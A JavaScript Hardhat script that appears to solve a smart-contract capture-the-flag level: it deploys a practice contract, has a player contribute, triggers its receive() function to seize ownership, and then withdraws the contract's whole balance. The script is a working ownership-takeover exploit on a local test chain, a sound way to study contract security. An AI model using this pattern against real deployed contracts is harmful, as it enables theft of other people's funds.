import { ethers } from "hardhat";


async function main() {
  const [owner, player] = await ethers.getSigners();

  console.log("Deploying contracts with the account:", owner.address);

  console.log("Account balance:", (await owner.getBalance()).toString());

  const fallbackctf = await ethers.getContractFactory("fallbackCTF1");
  const fallback = await fallbackctf.deploy();

  console.log("Fallback Contract Instance address:", fallback.address);

  console.log(
    "Balance of the Contract:",
    (await ethers.provider.getBalance(fallback.address)).toString()
  );
  console.log("Owner of the Contract:", (await fallback.owner()).toString());
  console.log(
    "Player contribution:",
    (await fallback.contributions(player.address)).toString()
  );

  // player contributing 1 ether
  await fallback
    .connect(player)
    .contribute({ value: ethers.utils.parseEther("0.00001") });
  console.log(
    "Player contribution:",
    (await fallback.contributions(player.address)).toString()
  );

  // expect to fail
  // await fallback.connect(player).withdraw();  // as player is not the owner, will revert
  // "reverted with reason string 'caller is not the owner' "
  console.log(
    "Balance of the Contract:",
    (await ethers.provider.getBalance(fallback.address)).toString()
  );

  // this will work and trigger receive() function
  await player.sendTransaction({
    to: fallback.address,
    value: ethers.utils.parseEther("0.00001"),
  });

  
  console.log("Owner of the Contract:", (await fallback.owner()).toString());

  console.log("Balance of the Player:", (await player.getBalance()).toString());
  console.log(
    "Balance of the Contract:",
    (await ethers.provider.getBalance(fallback.address)).toString()
  );

  await fallback.connect(player).withdraw(); // as player is the owner now
  console.log("----------------draining the account------------------");
  console.log(
    "Balance of the Contract:",
    (await ethers.provider.getBalance(fallback.address)).toString()
  );

  // Balance of the Player :
  console.log("Balance of the Player:", (await player.getBalance()).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
